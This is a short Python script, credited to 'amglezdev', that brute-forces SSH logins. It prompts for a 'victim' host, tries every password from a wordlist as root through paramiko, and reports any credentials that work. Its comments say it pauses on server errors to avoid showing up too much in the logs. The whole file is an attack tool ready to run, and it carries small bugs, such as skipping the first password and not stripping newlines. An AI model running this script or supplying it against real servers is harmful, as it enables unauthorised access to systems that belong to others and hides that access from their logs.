import paramiko
import socket
import time
#@Author amglezdev

def sshAttack(host, username, password):
    
    #Sshclient connection
    ssh = paramiko.SSHClient() 
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(hostname=host, username=username, password=password, timeout=3)
    except socket.timeout:
        # In case the host is innactive
        print("Host: {hostname} is unreachable.")
        return False
        #In case credentials are not right
    except paramiko.AuthenticationException: 
        print("Invalid credentials for " +  username +  ":" + password)
        return False
        #This is to avoid being too much on the logs
    except paramiko.SSHException:
        print("Server taking too long, delaying next attempt")
        time.sleep(60) 
        return sshAttack(host, username, password)
    else:
        #Connection was established successfully
        print("Right credentials at :\n\tHOSTNAME:" + host + "\n\tUSERNAME:" +  username + "\n\tPASSWORD:" + password + "\n")
        return True


#This is were the input goes
print("Enter host")
victim = input()
password = open("wordlist.txt", 'r')
password.readline()


#The number of passwords we have is the number of times we can attack
for p in password:
    sshAttack(str(victim),"root",p)